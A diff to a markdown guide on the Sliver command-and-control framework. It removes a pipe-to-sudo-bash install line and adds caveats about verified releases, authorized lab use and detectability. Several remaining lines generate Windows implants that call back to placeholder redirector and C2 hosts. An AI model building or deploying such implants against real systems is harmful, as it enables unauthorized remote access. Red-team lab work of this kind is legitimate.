@@ -173,22 +173,23 @@ Sliver is an open-source C2 framework from BishopFox. Written in Go - implants c
 
 ```bash
 # Server install (Linux)
-curl https://sliver.sh/install | sudo bash
+# Use the official project release/install documentation:
+# https://github.com/BishopFox/sliver
+# Select a specific release, inspect installation steps, and verify published
+# checksums/signatures before installing. Do not pipe a moving URL to sudo bash.
 
-# Start Sliver server
+# Start Sliver server and client only inside an isolated, authorized lab.
 sliver-server
-
-# Connect client
 sliver-client
 ```
 
 ### Implant Generation
 
 ```bash
-# HTTPS implant
+# HTTPS implant (encrypted transport does not make C2 traffic undetectable)
 generate --http https://your.redirector.com --os windows --arch amd64 --save /tmp/implant.exe
 
-# mTLS implant (more secure, harder to detect)
+# mTLS uses mutual authentication; its traffic can still be monitored and detected
 generate --mtls your.c2server.com:8888 --os windows --arch amd64
 
 # DNS implant
